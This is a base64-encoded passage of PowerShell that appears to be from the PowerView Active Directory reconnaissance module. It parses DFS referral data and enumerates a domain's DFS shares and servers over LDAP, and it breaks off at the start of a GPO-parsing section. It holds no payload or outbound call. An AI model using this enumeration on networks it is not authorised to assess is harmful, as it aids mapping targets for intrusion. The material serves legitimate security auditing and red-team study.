ICAgICAgJHZlcnNpb25fc3RhcnQgPSAkY29tbWVudF90aW1lc3RhbXBfZW5kICArIDEKICAgICAgICAgICAgICAgICAgICAgICAgJHZlcnNpb25fZW5kID0gJHZlcnNpb25fc3RhcnQgKyAzCiAgICAgICAgICAgICAgICAgICAgICAgICR2ZXJzaW9uID0gW2JpdGNvbnZlcnRlcl06OlRvVUludDMyKCRibG9iX2RhdGFbJHZlcnNpb25fc3RhcnQuLiR2ZXJzaW9uX2VuZF0sMCkKCiAgICAgICAgICAgICAgICAgICAgICAgICMgUGFyc2UgcmVzdCBvZiBERlNOYW1lc3BhY2VSb290T3JMaW5rQmxvYiBoZXJlCiAgICAgICAgICAgICAgICAgICAgICAgICRkZnNfdGFyZ2V0bGlzdF9ibG9iX3NpemVfc3RhcnQgPSAkdmVyc2lvbl9lbmQgKyAxCiAgICAgICAgICAgICAgICAgICAgICAgICRkZnNfdGFyZ2V0bGlzdF9ibG9iX3NpemVfZW5kID0gJGRmc190YXJnZXRsaXN0X2Jsb2Jfc2l6ZV9zdGFydCArIDMKICAgICAgICAgICAgICAgICAgICAgICAgJGRmc190YXJnZXRsaXN0X2Jsb2Jfc2l6ZSA9IFtiaXRjb252ZXJ0ZXJdOjpUb1VJbnQzMigkYmxvYl9kYXRhWyRkZnNfdGFyZ2V0bGlzdF9ibG9iX3NpemVfc3RhcnQuLiRkZnNfdGFyZ2V0bGlzdF9ibG9iX3NpemVfZW5kXSwwKQoKICAgICAgICAgICAgICAgICAgICAgICAgJGRmc190YXJnZXRsaXN0X2Jsb2Jfc3RhcnQgPSAkZGZzX3RhcmdldGxpc3RfYmxvYl9zaXplX2VuZCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgJGRmc190YXJnZXRsaXN0X2Jsb2JfZW5kID0gJGRmc190YXJnZXRsaXN0X2Jsb2Jfc3RhcnQgKyAkZGZzX3RhcmdldGxpc3RfYmxvYl9zaXplIC0gMQogICAgICAgICAgICAgICAgICAgICAgICAkZGZzX3RhcmdldGxpc3RfYmxvYiA9ICRibG9iX2RhdGFbJGRmc190YXJnZXRsaXN0X2Jsb2Jfc3RhcnQuLiRkZnNfdGFyZ2V0bGlzdF9ibG9iX2VuZF0KICAgICAgICAgICAgICAgICAgICAgICAgJHJlc2VydmVkX2Jsb2Jfc2l6ZV9zdGFydCA9ICRkZnNfdGFyZ2V0bGlzdF9ibG9iX2VuZCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgJHJlc2VydmVkX2Jsb2Jfc2l6ZV9lbmQgPSAkcmVzZXJ2ZWRfYmxvYl9zaXplX3N0YXJ0ICsgMwogICAgICAgICAgICAgICAgICAgICAgICAkcmVzZXJ2ZWRfYmxvYl9zaXplID0gW2JpdGNvbnZlcnRlcl06OlRvVUludDMyKCRibG9iX2RhdGFbJHJlc2VydmVkX2Jsb2Jfc2l6ZV9zdGFydC4uJHJlc2VydmVkX2Jsb2Jfc2l6ZV9lbmRdLDApCgogICAgICAgICAgICAgICAgICAgICAgICAkcmVzZXJ2ZWRfYmxvYl9zdGFydCA9ICRyZXNlcnZlZF9ibG9iX3NpemVfZW5kICsgMQogICAgICAgICAgICAgICAgICAgICAgICAkcmVzZXJ2ZWRfYmxvYl9lbmQgPSAkcmVzZXJ2ZWRfYmxvYl9zdGFydCArICRyZXNlcnZlZF9ibG9iX3NpemUgLSAxCiAgICAgICAgICAgICAgICAgICAgICAgICRyZXNlcnZlZF9ibG9iID0gJGJsb2JfZGF0YVskcmVzZXJ2ZWRfYmxvYl9zdGFydC4uJHJlc2VydmVkX2Jsb2JfZW5kXQogICAgICAgICAgICAgICAgICAgICAgICAkcmVmZXJyYWxfdHRsX3N0YXJ0ID0gJHJlc2VydmVkX2Jsb2JfZW5kICsgMQogICAgICAgICAgICAgICAgICAgICAgICAkcmVmZXJyYWxfdHRsX2VuZCA9ICRyZWZlcnJhbF90dGxfc3RhcnQgKyAzCiAgICAgICAgICAgICAgICAgICAgICAgICRyZWZlcnJhbF90dGwgPSBbYml0Y29udmVydGVyXTo6VG9VSW50MzIoJGJsb2JfZGF0YVskcmVmZXJyYWxfdHRsX3N0YXJ0Li4kcmVmZXJyYWxfdHRsX2VuZF0sMCkKCiAgICAgICAgICAgICAgICAgICAgICAgICNQYXJzZSBERlNUYXJnZXRMaXN0QmxvYgogICAgICAgICAgICAgICAgICAgICAgICAkdGFyZ2V0X2NvdW50X3N0YXJ0ID0gMAogICAgICAgICAgICAgICAgICAgICAgICAkdGFyZ2V0X2NvdW50X2VuZCA9ICR0YXJnZXRfY291bnRfc3RhcnQgKyAzCiAgICAgICAgICAgICAgICAgICAgICAgICR0YXJnZXRfY291bnQgPSBbYml0Y29udmVydGVyXTo6VG9VSW50MzIoJGRmc190YXJnZXRsaXN0X2Jsb2JbJHRhcmdldF9jb3VudF9zdGFydC4uJHRhcmdldF9jb3VudF9lbmRdLDApCiAgICAgICAgICAgICAgICAgICAgICAgICR0X29mZnNldCA9ICR0YXJnZXRfY291bnRfZW5kICsgMQoKICAgICAgICAgICAgICAgICAgICAgICAgZm9yKCRqPTE7ICRqIC1sZSAkdGFyZ2V0X2NvdW50OyAkaisrKXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0YXJnZXRfZW50cnlfc2l6ZV9zdGFydCA9ICR0X29mZnNldAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRhcmdldF9lbnRyeV9zaXplX2VuZCA9ICR0YXJnZXRfZW50cnlfc2l6ZV9zdGFydCArIDMKICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0YXJnZXRfZW50cnlfc2l6ZSA9IFtiaXRjb252ZXJ0ZXJdOjpUb1VJbnQzMigkZGZzX3RhcmdldGxpc3RfYmxvYlskdGFyZ2V0X2VudHJ5X3NpemVfc3RhcnQuLiR0YXJnZXRfZW50cnlfc2l6ZV9lbmRdLDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGFyZ2V0X3RpbWVfc3RhbXBfc3RhcnQgPSAkdGFyZ2V0X2VudHJ5X3NpemVfZW5kICsgMQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRhcmdldF90aW1lX3N0YW1wX2VuZCA9ICR0YXJnZXRfdGltZV9zdGFtcF9zdGFydCArIDcKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgRklMRVRJTUUgYWdhaW4gb3Igc3BlY2lhbCBpZiBwcmlvcml0eSByYW5rIGFuZCBwcmlvcml0eSBjbGFzcyAwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGFyZ2V0X3RpbWVfc3RhbXAgPSAkZGZzX3RhcmdldGxpc3RfYmxvYlskdGFyZ2V0X3RpbWVfc3RhbXBfc3RhcnQuLiR0YXJnZXRfdGltZV9zdGFtcF9lbmRdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGFyZ2V0X3N0YXRlX3N0YXJ0ID0gJHRhcmdldF90aW1lX3N0YW1wX2VuZCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0YXJnZXRfc3RhdGVfZW5kID0gJHRhcmdldF9zdGF0ZV9zdGFydCArIDMKICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0YXJnZXRfc3RhdGUgPSBbYml0Y29udmVydGVyXTo6VG9VSW50MzIoJGRmc190YXJnZXRsaXN0X2Jsb2JbJHRhcmdldF9zdGF0ZV9zdGFydC4uJHRhcmdldF9zdGF0ZV9lbmRdLDApCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRhcmdldF90eXBlX3N0YXJ0ID0gJHRhcmdldF9zdGF0ZV9lbmQgKyAxCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGFyZ2V0X3R5cGVfZW5kID0gJHRhcmdldF90eXBlX3N0YXJ0ICsgMwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRhcmdldF90eXBlID0gW2JpdGNvbnZlcnRlcl06OlRvVUludDMyKCRkZnNfdGFyZ2V0bGlzdF9ibG9iWyR0YXJnZXRfdHlwZV9zdGFydC4uJHRhcmdldF90eXBlX2VuZF0sMCkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc2VydmVyX25hbWVfc2l6ZV9zdGFydCA9ICR0YXJnZXRfdHlwZV9lbmQgKyAxCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc2VydmVyX25hbWVfc2l6ZV9lbmQgPSAkc2VydmVyX25hbWVfc2l6ZV9zdGFydCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzZXJ2ZXJfbmFtZV9zaXplID0gW2JpdGNvbnZlcnRlcl06OlRvVUludDE2KCRkZnNfdGFyZ2V0bGlzdF9ibG9iWyRzZXJ2ZXJfbmFtZV9zaXplX3N0YXJ0Li4kc2VydmVyX25hbWVfc2l6ZV9lbmRdLDApCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHNlcnZlcl9uYW1lX3N0YXJ0ID0gJHNlcnZlcl9uYW1lX3NpemVfZW5kICsgMQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHNlcnZlcl9uYW1lX2VuZCA9ICRzZXJ2ZXJfbmFtZV9zdGFydCArICRzZXJ2ZXJfbmFtZV9zaXplIC0gMQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHNlcnZlcl9uYW1lID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRTdHJpbmcoJGRmc190YXJnZXRsaXN0X2Jsb2JbJHNlcnZlcl9uYW1lX3N0YXJ0Li4kc2VydmVyX25hbWVfZW5kXSkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc2hhcmVfbmFtZV9zaXplX3N0YXJ0ID0gJHNlcnZlcl9uYW1lX2VuZCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzaGFyZV9uYW1lX3NpemVfZW5kID0gJHNoYXJlX25hbWVfc2l6ZV9zdGFydCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzaGFyZV9uYW1lX3NpemUgPSBbYml0Y29udmVydGVyXTo6VG9VSW50MTYoJGRmc190YXJnZXRsaXN0X2Jsb2JbJHNoYXJlX25hbWVfc2l6ZV9zdGFydC4uJHNoYXJlX25hbWVfc2l6ZV9lbmRdLDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc2hhcmVfbmFtZV9zdGFydCA9ICRzaGFyZV9uYW1lX3NpemVfZW5kICsgMQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHNoYXJlX25hbWVfZW5kID0gJHNoYXJlX25hbWVfc3RhcnQgKyAkc2hhcmVfbmFtZV9zaXplIC0gMQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHNoYXJlX25hbWUgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldFN0cmluZygkZGZzX3RhcmdldGxpc3RfYmxvYlskc2hhcmVfbmFtZV9zdGFydC4uJHNoYXJlX25hbWVfZW5kXSkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGFyZ2V0X2xpc3QgKz0gIlxcJHNlcnZlcl9uYW1lXCRzaGFyZV9uYW1lIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRfb2Zmc2V0ID0gJHNoYXJlX25hbWVfZW5kICsgMQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJG9mZnNldCA9ICRibG9iX2RhdGFfZW5kICsgMQogICAgICAgICAgICAgICAgJGRmc19wa3RfcHJvcGVydGllcyA9IEB7CiAgICAgICAgICAgICAgICAgICAgJ05hbWUnID0gJGJsb2JfbmFtZQogICAgICAgICAgICAgICAgICAgICdQcmVmaXgnID0gJHByZWZpeAogICAgICAgICAgICAgICAgICAgICdUYXJnZXRMaXN0JyA9ICR0YXJnZXRfbGlzdAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJG9iamVjdF9saXN0ICs9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFBTT2JqZWN0IC1Qcm9wZXJ0eSAkZGZzX3BrdF9wcm9wZXJ0aWVzCiAgICAgICAgICAgICAgICAkcHJlZml4ID0gJE51bGwKICAgICAgICAgICAgICAgICRibG9iX25hbWUgPSAkTnVsbAogICAgICAgICAgICAgICAgJHRhcmdldF9saXN0ID0gJE51bGwKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJHNlcnZlcnMgPSBAKCkKICAgICAgICAgICAgJG9iamVjdF9saXN0IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgaWYgKCRfLlRhcmdldExpc3QpIHsKICAgICAgICAgICAgICAgICAgICAkXy5UYXJnZXRMaXN0IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICAkc2VydmVycyArPSAkXy5zcGxpdCgnXCcpWzJdCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICAkc2VydmVycwogICAgICAgIH0KCiAgICAgICAgZnVuY3Rpb24gR2V0LURvbWFpbkRGU1NoYXJlVjEgewogICAgICAgICAgICBbQ21kbGV0QmluZGluZygpXQogICAgICAgICAgICBQYXJhbSgKICAgICAgICAgICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAgICAgICAgICREb21haW4sCgogICAgICAgICAgICAgICAgW1N0cmluZ10KICAgICAgICAgICAgICAgICRTZWFyY2hCYXNlLAoKICAgICAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICAgICAkU2VydmVyLAoKICAgICAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCgogICAgICAgICAgICAgICAgW0ludF0KICAgICAgICAgICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKCiAgICAgICAgICAgICAgICBbSW50XQogICAgICAgICAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKCiAgICAgICAgICAgICAgICBbU3dpdGNoXQogICAgICAgICAgICAgICAgJFRvbWJzdG9uZSwKCiAgICAgICAgICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICAgICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICAgICAgICAgICkKCiAgICAgICAgICAgICRERlNzZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAUFNCb3VuZFBhcmFtZXRlcnMKCiAgICAgICAgICAgIGlmICgkREZTc2VhcmNoZXIpIHsKICAgICAgICAgICAgICAgICRERlNzaGFyZXMgPSBAKCkKICAgICAgICAgICAgICAgICRERlNzZWFyY2hlci5maWx0ZXIgPSAnKCYob2JqZWN0Q2xhc3M9ZlREZnMpKScKCiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICRSZXN1bHRzID0gJERGU1NlYXJjaGVyLkZpbmRBbGwoKQogICAgICAgICAgICAgICAgICAgICRSZXN1bHRzIHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgICRQcm9wZXJ0aWVzID0gJF8uUHJvcGVydGllcwogICAgICAgICAgICAgICAgICAgICAgICAkUmVtb3RlTmFtZXMgPSAkUHJvcGVydGllcy5yZW1vdGVzZXJ2ZXJuYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICRQa3QgPSAkUHJvcGVydGllcy5wa3QKCiAgICAgICAgICAgICAgICAgICAgICAgICRERlNzaGFyZXMgKz0gJFJlbW90ZU5hbWVzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoICRfLkNvbnRhaW5zKCdcJykgKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE5ldy1PYmplY3QgLVR5cGVOYW1lIFBTT2JqZWN0IC1Qcm9wZXJ0eSBAeydOYW1lJz0kUHJvcGVydGllcy5uYW1lWzBdOydSZW1vdGVTZXJ2ZXJOYW1lJz0kXy5zcGxpdCgnXCcpWzJdfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkRGU1NoYXJlXSBHZXQtRG9tYWluREZTU2hhcmVWMSBlcnJvciBpbiBwYXJzaW5nIERGUyBzaGFyZSA6ICRfIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmICgkUmVzdWx0cykgewogICAgICAgICAgICAgICAgICAgICAgICB0cnkgeyAkUmVzdWx0cy5kaXNwb3NlKCkgfQogICAgICAgICAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkRGU1NoYXJlXSBHZXQtRG9tYWluREZTU2hhcmVWMSBlcnJvciBkaXNwb3Npbmcgb2YgdGhlIFJlc3VsdHMgb2JqZWN0OiAkXyIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkREZTU2VhcmNoZXIuZGlzcG9zZSgpCgogICAgICAgICAgICAgICAgICAgIGlmICgkcGt0IC1hbmQgJHBrdFswXSkgewogICAgICAgICAgICAgICAgICAgICAgICBQYXJzZS1Qa3QgJHBrdFswXSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgSWYgYSBmb2xkZXIgZG9lc24ndCBoYXZlIGEgcmVkaXJlY3Rpb24gaXQgd2lsbCBoYXZlIGEgdGFyZ2V0IGxpa2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgXFxudWxsXFRlc3ROYW1lU3BhY2VcZm9sZGVyXC5ERlNGb2xkZXJMaW5rIHNvIHdlIGRvIGFjdHVhbGx5IHdhbnQgdG8gbWF0Y2gKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgb24gJ251bGwnIHJhdGhlciB0aGFuICROdWxsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJF8gLW5lICdudWxsJykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE5ldy1PYmplY3QgLVR5cGVOYW1lIFBTT2JqZWN0IC1Qcm9wZXJ0eSBAeydOYW1lJz0kUHJvcGVydGllcy5uYW1lWzBdOydSZW1vdGVTZXJ2ZXJOYW1lJz0kX30KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LURvbWFpbkRGU1NoYXJlXSBHZXQtRG9tYWluREZTU2hhcmVWMSBlcnJvciA6ICRfIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJERGU3NoYXJlcyB8IFNvcnQtT2JqZWN0IC1VbmlxdWUgLVByb3BlcnR5ICdSZW1vdGVTZXJ2ZXJOYW1lJwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiBHZXQtRG9tYWluREZTU2hhcmVWMiB7CiAgICAgICAgICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICAgICAgICAgIFBhcmFtKAogICAgICAgICAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICAgICAgICAgJERvbWFpbiwKCiAgICAgICAgICAgICAgICBbU3RyaW5nXQogICAgICAgICAgICAgICAgJFNlYXJjaEJhc2UsCgogICAgICAgICAgICAgICAgW1N0cmluZ10KICAgICAgICAgICAgICAgICRTZXJ2ZXIsCgogICAgICAgICAgICAgICAgW1N0cmluZ10KICAgICAgICAgICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKCiAgICAgICAgICAgICAgICBbSW50XQogICAgICAgICAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAoKICAgICAgICAgICAgICAgIFtJbnRdCiAgICAgICAgICAgICAgICAkU2VydmVyVGltZUxpbWl0LAoKICAgICAgICAgICAgICAgIFtTd2l0Y2hdCiAgICAgICAgICAgICAgICAkVG9tYnN0b25lLAoKICAgICAgICAgICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgICAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICAgICAgICAgKQoKICAgICAgICAgICAgJERGU3NlYXJjaGVyID0gR2V0LURvbWFpblNlYXJjaGVyIEBQU0JvdW5kUGFyYW1ldGVycwoKICAgICAgICAgICAgaWYgKCRERlNzZWFyY2hlcikgewogICAgICAgICAgICAgICAgJERGU3NoYXJlcyA9IEAoKQogICAgICAgICAgICAgICAgJERGU3NlYXJjaGVyLmZpbHRlciA9ICcoJihvYmplY3RDbGFzcz1tc0RGUy1MaW5rdjIpKScKICAgICAgICAgICAgICAgICROdWxsID0gJERGU1NlYXJjaGVyLlByb3BlcnRpZXNUb0xvYWQuQWRkUmFuZ2UoKCdtc2Rmcy1saW5rcGF0aHYyJywnbXNERlMtVGFyZ2V0TGlzdHYyJykpCgogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAkUmVzdWx0cyA9ICRERlNTZWFyY2hlci5GaW5kQWxsKCkKICAgICAgICAgICAgICAgICAgICAkUmVzdWx0cyB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICAkUHJvcGVydGllcyA9ICRfLlByb3BlcnRpZXMKICAgICAgICAgICAgICAgICAgICAgICAgJHRhcmdldF9saXN0ID0gJFByb3BlcnRpZXMuJ21zZGZzLXRhcmdldGxpc3R2MidbMF0KICAgICAgICAgICAgICAgICAgICAgICAgJHhtbCA9IFt4bWxdW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRTdHJpbmcoJHRhcmdldF9saXN0WzIuLigkdGFyZ2V0X2xpc3QuTGVuZ3RoLTEpXSkKICAgICAgICAgICAgICAgICAgICAgICAgJERGU3NoYXJlcyArPSAkeG1sLnRhcmdldHMuQ2hpbGROb2RlcyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJFRhcmdldCA9ICRfLklubmVyVGV4dAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICggJFRhcmdldC5Db250YWlucygnXCcpICkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkREZTcm9vdCA9ICRUYXJnZXQuc3BsaXQoJ1wnKVszXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU2hhcmVOYW1lID0gJFByb3BlcnRpZXMuJ21zZGZzLWxpbmtwYXRodjInWzBdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE5ldy1PYmplY3QgLVR5cGVOYW1lIFBTT2JqZWN0IC1Qcm9wZXJ0eSBAeydOYW1lJz0iJERGU3Jvb3QkU2hhcmVOYW1lIjsnUmVtb3RlU2VydmVyTmFtZSc9JFRhcmdldC5zcGxpdCgnXCcpWzJdfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkRGU1NoYXJlXSBHZXQtRG9tYWluREZTU2hhcmVWMiBlcnJvciBpbiBwYXJzaW5nIHRhcmdldCA6ICRfIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmICgkUmVzdWx0cykgewogICAgICAgICAgICAgICAgICAgICAgICB0cnkgeyAkUmVzdWx0cy5kaXNwb3NlKCkgfQogICAgICAgICAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkRGU1NoYXJlXSBFcnJvciBkaXNwb3Npbmcgb2YgdGhlIFJlc3VsdHMgb2JqZWN0OiAkXyIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkREZTU2VhcmNoZXIuZGlzcG9zZSgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1Eb21haW5ERlNTaGFyZV0gR2V0LURvbWFpbkRGU1NoYXJlVjIgZXJyb3IgOiAkXyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRERlNzaGFyZXMgfCBTb3J0LU9iamVjdCAtVW5pcXVlIC1Qcm9wZXJ0eSAnUmVtb3RlU2VydmVyTmFtZScKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICAkREZTc2hhcmVzID0gQCgpCgogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7CiAgICAgICAgICAgIEZvckVhY2ggKCRUYXJnZXREb21haW4gaW4gJERvbWFpbikgewogICAgICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICRUYXJnZXREb21haW4KICAgICAgICAgICAgICAgIGlmICgkVmVyc2lvbiAtbWF0Y2ggJ2FsbHwxJykgewogICAgICAgICAgICAgICAgICAgICRERlNzaGFyZXMgKz0gR2V0LURvbWFpbkRGU1NoYXJlVjEgQFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoJFZlcnNpb24gLW1hdGNoICdhbGx8MicpIHsKICAgICAgICAgICAgICAgICAgICAkREZTc2hhcmVzICs9IEdldC1Eb21haW5ERlNTaGFyZVYyIEBTZWFyY2hlckFyZ3VtZW50cwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBpZiAoJFZlcnNpb24gLW1hdGNoICdhbGx8MScpIHsKICAgICAgICAgICAgICAgICRERlNzaGFyZXMgKz0gR2V0LURvbWFpbkRGU1NoYXJlVjEgQFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRWZXJzaW9uIC1tYXRjaCAnYWxsfDInKSB7CiAgICAgICAgICAgICAgICAkREZTc2hhcmVzICs9IEdldC1Eb21haW5ERlNTaGFyZVYyIEBTZWFyY2hlckFyZ3VtZW50cwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICAkREZTc2hhcmVzIHwgU29ydC1PYmplY3QgLVByb3BlcnR5ICgnUmVtb3RlU2VydmVyTmFtZScsJ05hbWUnKSAtVW5pcXVlCiAgICB9Cn0KCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojCiMgR1BPIHJlbGF0ZWQgZnVuY3Rpb25zLgojCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgpmdW5jdGlvbiBHZXQtR3B0VG1wbCB7CjwjCi5TWU5PUFNJUwoKSGVscGVyIHRvIHBhcnNlIGEgR3B0VG1wbC5pbmYgcG9saWN5IGZpbGUgcGF0aCBpbnRvIGEgaGFzaHRhYmxlLgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBBZGQtUmVtb3RlQ29ubmVjdGlvbiwgUmVtb3ZlLVJlbW90ZUNvbm5lY3Rpb24sIEdldC1JbmlDb250ZW50ICAKCi5ERVNDUklQVElPTgoKUGFyc2VzIGEgR3B0VG1wbC5pbmYgaW50byBhIGN1c3RvbSBoYXNodGFibGUgdXNpbmcgR2V0LUluaUNvbnRlbnQuIElmIGEKR1BPIG9iamVjdCBpcyBwYXNzZWQsIEdQT1BBVEhcTUFDSElORVxNaWNyb3NvZnRcV2luZG93cyBO